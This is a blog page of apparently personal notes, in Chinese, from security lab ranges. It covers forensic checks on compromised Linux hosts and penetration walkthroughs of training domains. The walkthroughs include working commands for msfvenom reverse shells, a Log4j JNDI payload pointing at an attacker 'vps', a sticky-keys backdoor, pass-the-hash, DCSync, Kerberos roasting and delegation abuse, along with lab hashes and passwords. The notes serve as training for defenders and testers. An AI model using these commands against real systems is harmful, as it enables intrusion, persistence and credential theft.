<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706220505228.png" srcset="/img/loading.gif" lazyload alt="image-20240706220505228"></p>
<p>sudo登录失败</p>
<p>cat &#x2F;var&#x2F;log&#x2F;auth.log.1 |grep zhangsan</p>
<p>内核版本</p>
<ul>
<li>uname -a</li>
<li>cat &#x2F;proc&#x2F;version</li>
<li>dmesg|grep -i Linux</li>
</ul>
<p>端口排查</p>
<p>netstat -antpl</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706221648613.png" srcset="/img/loading.gif" lazyload alt="image-20240706221648613"></p>
<p>这里一直以为是在外联的2518 但是需要结合小皮面板找到5566恶意端口</p>
<p>xp 6进入小皮面板配置后查看</p>
<p>MYSQL</p>
<p>空口令 select user,authentication_string from mysql.user </p>
<p>密码复杂度 show variables like ‘validate%’</p>
<p>失败次数 show variables like ‘%connetction_control%’</p>
<p>超时时间 show variables like ‘%timeout%’</p>
<p>日志设置 show global variables like ‘%’</p>
<h2 id="linux-挖矿2"><a href="#linux-挖矿2" class="headerlink" title="linux-挖矿2"></a>linux-挖矿2</h2><p>系统别名查看</p>
<p>alias</p>
<p>后门用户</p>
<p>cat &#x2F;etc&#x2F;passwd|grep .*:.*:0:.*</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240707152901974.png" srcset="/img/loading.gif" lazyload alt="image-20240707152901974"></p>
<p>ssh后门日期</p>
<p>stat &#x2F;home&#x2F;admin&#x2F;.ssh&#x2F;authorized_keys</p>
<p>被篡改的环境变量文件</p>
<p>环境变量文件都在&#x2F;etc 和~目录下</p>
<p>find &#x2F;etc&#x2F; ~  -type f -mtime -T | xargs ls -la</p>
<h2 id="linux-algo挖矿"><a href="#linux-algo挖矿" class="headerlink" title="linux-algo挖矿"></a>linux-algo挖矿</h2><p>黑客ip</p>
<p>grep failed pass &#x2F;var&#x2F;log&#x2F;auth&#x2F;log.1</p>
<p>挖矿外联ip</p>
<p>1.netstat -pantu查看的不对</p>
<p>2.crontab -l计划任务找到dhcpd文件 </p>
<p><code>dhcpd</code></p>
<p><code>lsof /usr/bin/dhcpd</code></p>
<p><code>netstat -pantu|grep pid</code></p>
<p>然后还是错的。。。</p>
<p>权限维持</p>
<p>上面的dhcpd文件</p>
<p>黑客用户名</p>
<p>passwd中没有</p>
<p>找到&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</p>
<h2 id="NOPTEAM-A"><a href="#NOPTEAM-A" class="headerlink" title="NOPTEAM A"></a>NOPTEAM A</h2><p>禅道版本查看</p>
<p>find &#x2F;opt&#x2F;zbox -type f -name “VER*”</p>
<p>cat xxx</p>
<p>攻击工具</p>
<p>&#x2F;opt下翻到fscan</p>
<p>黑客登录用户</p>
<p>网上找到exp复现 id结果为nobody</p>
<p>主机B账号密码<br>&#x2F;opt下&#x2F;gj目录保存了fscan结果</p>
<h2 id="流量分析-tomcat"><a href="#流量分析-tomcat" class="headerlink" title="流量分析-tomcat"></a>流量分析-tomcat</h2><p>攻击者ip</p>
<p>tcp协议发现可疑的syn扫描</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240707172838610.png" srcset="/img/loading.gif" lazyload alt="image-20240707172838610"></p>
<p>攻击者ip–ip反查即可</p>
<p>web服务端口–追踪tcp包</p>
<p>网站账号密码</p>
<p>发现唯一的post包</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240707173225213.png" srcset="/img/loading.gif" lazyload alt="image-20240707173225213"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240707173251952.png" srcset="/img/loading.gif" lazyload alt="image-20240707173251952"></p>
<h1 id="i春秋"><a href="#i春秋" class="headerlink" title="i春秋"></a>i春秋</h1><h2 id="网鼎杯半决"><a href="#网鼎杯半决" class="headerlink" title="网鼎杯半决"></a>网鼎杯半决</h2><p>上fscan 发现wordpress</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104154012454.png" srcset="/img/loading.gif" lazyload alt="image-20241104154012454"></p>
<p>wordpress 这里直接去找登录口 弱口令admin&#x2F;123456就登录上去了</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104154154480.png" srcset="/img/loading.gif" lazyload alt="image-20241104154154480"></p>
<p>主题写马</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104154739132.png" srcset="/img/loading.gif" lazyload alt="image-20241104154739132"></p>
<p>连shell 根目录拿flag01（shell路径：wordpress 主题一般在&#x2F;wp-content&#x2F;themes&#x2F;下 拼接一下访问这个页面的url）</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104154859953.png" srcset="/img/loading.gif" lazyload alt="image-20241104154859953"></p>
<p>查网卡 上fscan </p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104155117253.png" srcset="/img/loading.gif" lazyload alt="image-20241104155117253"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104155534295.png" srcset="/img/loading.gif" lazyload alt="image-20241104155534295"></p>
<p>掏出最喜欢的venom+proxifier<img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104155838233.png" srcset="/img/loading.gif" lazyload alt="image-20241104155838233"></p>
<p>先去打MS17-010 172.22.15.24</p>
<p>给kali配上proxychains4</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104160913867.png" srcset="/img/loading.gif" lazyload alt="image-20241104160913867"></p>
<p>永恒之蓝好卡…</p>
<p>由于太卡了，hashdump下来再用哈希连接主机</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104161634833.png" srcset="/img/loading.gif" lazyload alt="image-20241104161634833"></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> psexec.py administrator@<span class="hljs-number">172.22.15.24</span> -hashes <span class="hljs-string">&quot;:0e52d03e9b939997401466a0ec5a9cbc&quot;</span> -codec gbk<br></code></pre></td></tr></table></figure>

<p>也可以使用CME</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104162919563.png" srcset="/img/loading.gif" lazyload alt="image-20241104162919563"></p>
<p>这里找flag可以用</p>
<p>findstr &#x2F;m &#x2F;i &#x2F;s “flag” *.txt</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104162530496.png" srcset="/img/loading.gif" lazyload alt="image-20241104162530496"></p>
<p>同样是单网卡主机 但是看到有phpstudy_pro,建立了新用户但是连接不上去<img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104163118993.png" srcset="/img/loading.gif" lazyload alt="image-20241104163118993"></p>
<p>回到<a target="_blank" rel="noopener" href="http://172.22.15.24/%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%BC%B1%E5%8F%A3%E4%BB%A4">http://172.22.15.24/，又是一个弱口令</a></p>
<p>后台管理找到用户名</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104164036051.png" srcset="/img/loading.gif" lazyload alt="image-20241104164036051"></p>
<p>生成一个字典</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104164222483.png" srcset="/img/loading.gif" lazyload alt="image-20241104164222483"></p>
<p>想到AS-REP ROASTING </p>
<p>GetNPUsers得到lixiuying和huachunmei未开启预认证</p>
<p>（这个工具需要指明域控ip，域名称后面要写&#x2F;）</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104164606565.png" srcset="/img/loading.gif" lazyload alt="image-20241104164606565"></p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">hashcat -m <span class="hljs-number">18200</span> <span class="hljs-symbol">&#x27;hash</span>&#x27; 字典 <span class="hljs-comment">--force</span><br></code></pre></td></tr></table></figure>

<p><a href="mailto:&#x6c;&#x69;&#x78;&#x69;&#117;&#121;&#x69;&#x6e;&#x67;&#x40;&#120;&#105;&#x61;&#x6f;&#114;&#x61;&#x6e;&#103;&#x2e;&#x6c;&#97;&#98;">&#x6c;&#x69;&#x78;&#x69;&#117;&#121;&#x69;&#x6e;&#x67;&#x40;&#120;&#105;&#x61;&#x6f;&#114;&#x61;&#x6e;&#103;&#x2e;&#x6c;&#97;&#98;</a>&#x2F;winniethepooh</p>
<p><a href="mailto:&#x68;&#117;&#97;&#99;&#104;&#117;&#x6e;&#x6d;&#101;&#x69;&#64;&#120;&#105;&#x61;&#111;&#x72;&#97;&#x6e;&#x67;&#x2e;&#x6c;&#97;&#98;">&#x68;&#117;&#97;&#99;&#104;&#117;&#x6e;&#x6d;&#101;&#x69;&#64;&#120;&#105;&#x61;&#111;&#x72;&#97;&#x6e;&#x67;&#x2e;&#x6c;&#97;&#98;</a>&#x2F;1qaz2wsx</p>
<p>使用密码去RDP登录另一台域内的主机(172.22.15.35)</p>
<p>可惜机子上找不到flag </p>
<p>上bloodhound找攻击路径</p>
<h2 id="TSclient"><a href="#TSclient" class="headerlink" title="TSclient"></a>TSclient</h2><p>一开始fscan扫到了iis和mssql，mssql试了弱口令检查工具和weekpass都没扫通，后面直接去看wp，我的服务字典太弱了</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241105221546610.png" srcset="/img/loading.gif" lazyload alt="image-20241105221546610"></p>
<p>用template执行命令成功</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241105221730360.png" srcset="/img/loading.gif" lazyload alt="image-20241105221730360"></p>
<p>这里直接用MDUT传马</p>
<p>记一下msf命令 服务器上一直生成不了 改用了cs</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">msfvenom -p windows/meterpreter_reverse_tcp lhost=ip lport=4444 -f elf &gt; 1<br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241105233312172.png" srcset="/img/loading.gif" lazyload alt="image-20241105233312172"></p>
<p>（由于是iis环境 查看特权）</p>
<p>whoami &#x2F;priv发现敏感特权，尝试土豆家族提权</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241105233722116.png" srcset="/img/loading.gif" lazyload alt="image-20241105233722116"></p>
<p>cs梼杌插件一个一个试 成功提权</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241105234232450.png" srcset="/img/loading.gif" lazyload alt="image-20241105234232450"></p>
<h2 id="Delegation（ok）"><a href="#Delegation（ok）" class="headerlink" title="Delegation（ok）"></a>Delegation（ok）</h2><p>开局一个cmseasy，直接搜nday找到后台admin&#x2F;123456登入</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106152541460.png" srcset="/img/loading.gif" lazyload alt="image-20241106152541460"></p>
<p>在系统模板的地方发现了php代码，尝试往模板加php代码但是把环境橄榄了</p>
<p>尝试其他nday</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106154340082.png" srcset="/img/loading.gif" lazyload alt="image-20241106154340082"></p>
<p><a target="_blank" rel="noopener" href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9Egetshell">CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞 | jdr</a></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106154304912.png" srcset="/img/loading.gif" lazyload alt="image-20241106154304912"></p>
<p>上来单网卡主机 上fscan扫</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106154525954.png" srcset="/img/loading.gif" lazyload alt="image-20241106154525954"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106154816517.png" srcset="/img/loading.gif" lazyload></p>
<p>整理一下结果172.22.4.7（域控） 19 （文件服务）36（入口） 45（IIS） 四台机子，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 bloodhound-python.py -u <span class="hljs-built_in">test</span> -p <span class="hljs-built_in">test</span>@123 -d xiaorang.lab -ns 172.22.4.7 -c All<br></code></pre></td></tr></table></figure>

<p>&#x2F;home&#x2F;flag01需要提权，尝试sudo和suid</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106154711002.png" srcset="/img/loading.gif" lazyload alt="image-20241106154711002"></p>
<p>存在diff 利用diff读取flag</p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/diff/">diff | GTFOBins</a></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106160048042.png" srcset="/img/loading.gif" lazyload alt="image-20241106160048042"></p>
<p>搭建代理</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106155308552.png" srcset="/img/loading.gif" lazyload alt="image-20241106155308552"></p>
<p>根据上面的提示</p>
<p>172.22.4.45的Adrian密码可以用rockyou爆破</p>
<p>crackmapexec爆破密码（有点慢 下次用hydra windows的爆破工具总是卡死）</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106161717224.png" srcset="/img/loading.gif" lazyload alt="image-20241106161717224"></p>
<p>爆出来密码过期</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106162034858.png" srcset="/img/loading.gif" lazyload alt="image-20241106162034858"></p>
<p>网上学到rdesktop使用</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106162336215.png" srcset="/img/loading.gif" lazyload alt="image-20241106162336215"></p>
<p>应该又需要提权，桌面找到一个privesc文件夹，注意到一个high</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106163100313.png" srcset="/img/loading.gif" lazyload alt="image-20241106163100313"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106163400628.png" srcset="/img/loading.gif" lazyload alt="image-20241106163400628"></p>
<p>certutil上传不了cs生成的服务马，但是使用rdesktop参数</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">-r sound<span class="hljs-keyword">:local</span> -r disk:<span class="hljs-attribute">LinuxPictures</span>=/home/kali/Desktop<br></code></pre></td></tr></table></figure>

<p>成功共享（nb！）</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">服务修改<br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&quot;</span> /v ImagePath /t REG_EXPAND_SZ /d <span class="hljs-string">&quot;C:\Users\Adrian\Desktop\a.exe&quot;</span> /f</span><br>服务启动<br>sc start gupdate<br></code></pre></td></tr></table></figure>

<p>以上一直使用cs没成功，后来选择粘滞键后门</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cobol">msfvenom -p windows/x64/exec cmd=&quot;C:\windows\system32\cmd.exe /c C:\Users\Adrian\Desktop\shift.bat&quot; --platform windows -f exe-service &gt; evil.exe<br>建立shift.bat<br>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;<br></code></pre></td></tr></table></figure>

<p><strong>锁定用户</strong>后激活粘纸键，添加管理员</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106220635060.png" srcset="/img/loading.gif" lazyload alt="image-20241106220635060"></p>
<p>拿下flag2</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106220826529.png" srcset="/img/loading.gif" lazyload alt="image-20241106220826529"></p>
<p>出于权限 上传sharphound后使用粘滞后门执行脚本，由于不是域管，bloodhound.py也不能执行</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106221721685.png" srcset="/img/loading.gif" lazyload alt="image-20241106221721685"></p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::logonpassword抓密码<br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106223542866.png" srcset="/img/loading.gif" lazyload alt="image-20241106223542866"></p>
<p>967b3bb068e0915336fff02bf1eaa71d</p>
<p>发现一个服务用户，bloodhound发现win19开启非约束委派</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106225005399.png" srcset="/img/loading.gif" lazyload alt="image-20241106225005399"></p>
<p>这里用到rubeus+dfscoerce，非约束委派在这里指的是域控通过kerberos去连接开启了非约束委派的机器上的服务，这个服务又被攻击者监听，TGT就被截取了，同时非约束委派导致TGT可以被利用</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1899592">域渗透之委派攻击详解（非约束委派&#x2F;约束委派&#x2F;资源委派）-腾讯云开发者社区-腾讯云</a></p>
<p>刚想说有点像NTLM RELAY利用打印机截取，就看到约束委派也可以利用打印机漏洞</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106234043842.png" srcset="/img/loading.gif" lazyload alt="image-20241106234043842"></p>
<p>roxychains4 -q python3 dfscoerce.py -u “WIN19$” -hashes :967b3bb068e0915336fff02bf1eaa71d -d xiaorang.lab -dc-ip 172.22.4.7 “WIN19” 172.22.4.7</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107000147043.png" srcset="/img/loading.gif" lazyload alt="image-20241107000147043"></p>
<p>“Rubeus (2).exe” ptt &#x2F;ticket:刚刚获取的票据成功获得权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit<br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107000530691.png" srcset="/img/loading.gif" lazyload alt="image-20241107000530691"></p>
<p>剩下两台机子都通过PTH拿到flag</p>
<p>python3 psexec.py xiaorang&#x2F;<a href="mailto:&#65;&#100;&#109;&#x69;&#110;&#105;&#115;&#116;&#114;&#x61;&#x74;&#x6f;&#x72;&#x40;&#49;&#x37;&#x32;&#46;&#50;&#50;&#46;&#x34;&#46;&#x31;&#57;">&#65;&#100;&#109;&#x69;&#110;&#105;&#115;&#116;&#114;&#x61;&#x74;&#x6f;&#x72;&#x40;&#49;&#x37;&#x32;&#46;&#50;&#50;&#46;&#x34;&#46;&#x31;&#57;</a> -hashes :4889f6553239ace1f7c47fa2c619c252 -codec gbk</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107001201646.png" srcset="/img/loading.gif" lazyload alt="image-20241107001201646"></p>
<h2 id="Hospital（ok）"><a href="#Hospital（ok）" class="headerlink" title="Hospital（ok）"></a>Hospital（ok）</h2><p>fscan扫到headdump泄露</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107141340678.png" srcset="/img/loading.gif" lazyload alt="image-20241107141340678"></p>
<p>访问heapdump下载内存转储文件</p>
<p>iwannagetall解密 找到shirokey</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107142152004.png" srcset="/img/loading.gif" lazyload alt="image-20241107142152004"></p>
<p>冰蝎成功连接</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107143034770.png" srcset="/img/loading.gif" lazyload alt="image-20241107143034770"></p>
<p>这里先修复了一下xshell的问题</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107145908508.png" srcset="/img/loading.gif" lazyload alt="image-20241107145908508"></p>
<p>这里用vim 直接去读&#x2F;root&#x2F;flag&#x2F;flag01.txt</p>
<p>fscan结果</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107150831524.png" srcset="/img/loading.gif" lazyload alt="image-20241107150831524"></p>
<p>发现还有一个236 一个 6存在 nacos漏洞</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107151420868.png" srcset="/img/loading.gif" lazyload alt="image-20241107151420868"></p>
<p>抓包 改ua头 </p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107151619059.png" srcset="/img/loading.gif" lazyload alt="image-20241107151619059"></p>
<p>demo&#x2F;demo<img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107151653157.png" srcset="/img/loading.gif" lazyload alt="image-20241107151653157"></p>
<p>找到配置文件</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span><br>  <span class="hljs-attr">servlet:</span><br>    <span class="hljs-attr">context-path:</span> <span class="hljs-string">/hello</span><br><br><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">application:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">db-config</span><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">nacos:</span><br>      <span class="hljs-attr">discovery:</span><br>        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8848</span><br>      <span class="hljs-attr">config:</span><br>        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8848</span><br>        <span class="hljs-attr">file-extension:</span> <span class="hljs-string">yaml</span><br>        <span class="hljs-attr">namespace:</span> <span class="hljs-string">dev</span><br>        <span class="hljs-attr">group:</span> <span class="hljs-string">DEFAULT_GROUP</span><br>        <span class="hljs-attr">data-id:</span> <span class="hljs-string">db-config.yaml</span><br>  <span class="hljs-attr">datasource:</span><br>    <span class="hljs-attr">mysql:</span><br>      <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/test?useSSL=false&amp;serverTimezone=UTC&amp;allowPublicKeyRetrieval=true</span><br>      <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>      <span class="hljs-attr">password:</span> <span class="hljs-string">P@ssWord!!!</span><br>  <span class="hljs-attr">redis:</span><br>    <span class="hljs-attr">host:</span> <span class="hljs-string">localhost</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">6379</span><br><br><span class="hljs-attr">management:</span><br>  <span class="hljs-attr">endpoints:</span><br>    <span class="hljs-attr">web:</span><br>      <span class="hljs-attr">exposure:</span><br>        <span class="hljs-attr">include:</span> <span class="hljs-string">&#x27;*&#x27;</span><br><br></code></pre></td></tr></table></figure>

<p>对于nacos后台 可以尝试写入内存马或者打yaml</p>
<p><a target="_blank" rel="noopener" href="https://h0ny.github.io/posts/Nacos-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">Nacos 漏洞利用总结 | h0ny’s blog</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">artsploit&#x2F;yaml-payload: A tiny project for generating SnakeYAML deserialization payloads</a></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107152256502.png" srcset="/img/loading.gif" lazyload alt="image-20241107152256502"></p>
<p>由于机器不出网 web01有python 这里可以python开服务器然后让nacos去连接恶意jar包</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107154831851.png" srcset="/img/loading.gif" lazyload alt="image-20241107154831851"></p>
<p>rdp连上去拿flag2</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107155054216.png" srcset="/img/loading.gif" lazyload alt="image-20241107155054216"></p>
<p>由于是组环境 直接访问236的web服务</p>
<p>登录框 跑了一会儿弱口令，报错发现fastjson</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107160515386.png" srcset="/img/loading.gif" lazyload alt="image-20241107160515386"></p>
<p>{“@type”: “java.lang.AutoCloseable” 获取到版本号</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107160613580.png" srcset="/img/loading.gif" lazyload alt="image-20241107160613580"></p>
<p>fastjsonscan梭哈</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107161804822.png" srcset="/img/loading.gif" lazyload alt="image-20241107161804822"></p>
<h2 id="Certify-（ok）"><a href="#Certify-（ok）" class="headerlink" title="Certify （ok）"></a>Certify （ok）</h2><p>fscan扫到 solar 版本较高很多poc没打通</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108101011057.png" srcset="/img/loading.gif" lazyload alt="image-20241108101011057"></p>
<p>发现使用了log4j</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108101942345.png" srcset="/img/loading.gif" lazyload alt="image-20241108101942345"></p>
<p>bp插件触发</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108101829908.png" srcset="/img/loading.gif" lazyload alt="image-20241108101829908"></p>
<p>开启恶意服务器和监听</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108102204726.png" srcset="/img/loading.gif" lazyload alt="image-20241108102204726"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108102404739.png" srcset="/img/loading.gif" lazyload alt="image-20241108102404739"></p>
<p>在靶机上执行</p>
<p>{jndi:ldap:&#x2F;&#x2F;vps:1389&#x2F;Basic&#x2F;ReverseShell&#x2F;vps&#x2F;port}</p>
<p>收到shell之后sudo -l发现grc有权限</p>
<p>pty敏感参数</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108103306212.png" srcset="/img/loading.gif" lazyload alt="image-20241108103306212"></p>
<p>gtfobins找到提权</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108103400973.png" srcset="/img/loading.gif" lazyload alt="image-20241108103400973"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108103444009.png" srcset="/img/loading.gif" lazyload alt="image-20241108103444009"></p>
<p>查网段，准备上fscan和venom</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108103504048.png" srcset="/img/loading.gif" lazyload alt="image-20241108103504048"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108103935545.png" srcset="/img/loading.gif" lazyload alt="image-20241108103935545"></p>
<p>整理一下结果</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108104255270.png" srcset="/img/loading.gif" lazyload alt="image-20241108104255270"></p>
<p>172.22.9段  </p>
<p>7（IIS域控） </p>
<p>19（入口） </p>
<p>26 （域成员）</p>
<p>47（apache ubuntu2 开了ftp服务）</p>
<p>先尝试ftp</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108105126638.png" srcset="/img/loading.gif" lazyload alt="image-20241108105126638"></p>
<p>找到flag02，把所有文件一个个get下来</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108105323711.png" srcset="/img/loading.gif" lazyload alt="image-20241108105323711"></p>
<p>flag中提示spn，使用Getuserspn</p>
<p>配合前面拿到的db</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108105741353.png" srcset="/img/loading.gif" lazyload alt="image-20241108105741353"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108105825733.png" srcset="/img/loading.gif" lazyload alt="image-20241108105825733"></p>
<p>windows下的工具走不通代理 使用hydra</p>
<p>先尝试域成员机器</p>
